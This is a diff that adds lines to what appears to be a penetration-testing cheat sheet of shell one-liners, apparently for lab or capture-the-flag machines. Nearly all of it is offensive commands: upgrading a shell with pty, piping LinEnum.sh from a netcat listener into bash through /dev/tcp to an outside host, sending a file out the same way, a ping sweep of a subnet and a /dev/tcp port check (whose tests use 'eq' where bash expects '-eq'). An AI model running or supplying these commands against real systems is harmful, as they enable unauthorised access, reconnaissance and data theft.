@@ -2,5 +2,30 @@
 
 python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
+export TERM=xterm
+stty raw -echo
 
 python -m SimpleHTTPServer
+
+ssh-keygen -l -E md5 -f ssh_host_rsa_key.pub
+
+nc -lvnp 9000 < LinEnum.sh
+bash < /dev/tcp/10.10.15.30/9000
+
+find / -newermt 2018-10-12 ! -newermt 2018-10-14 -type f -ls 2>/dev/null
+
+nc -lvnp 9000 > myfile.pdf
+cat myfile.pdf > /dev/tcp/10.10.15.30/9000
+
+#!/bin/bash
+for i in $(seq 2 254); do
+	ping -c 1 -W 1 172.16.20.$i 1>/dev/null 2>&1
+	if [[ $? eq 0 ]]; then
+		echo "172.16.20.$i - Online"
+	fi
+done
+
+echo 1 > /dev/tcp/172.16.20.20/$1 1>/dev/null 2>&1
+if [[ $? eq 0 ]]; then
+	echo "Port $1 is Open"
+fi
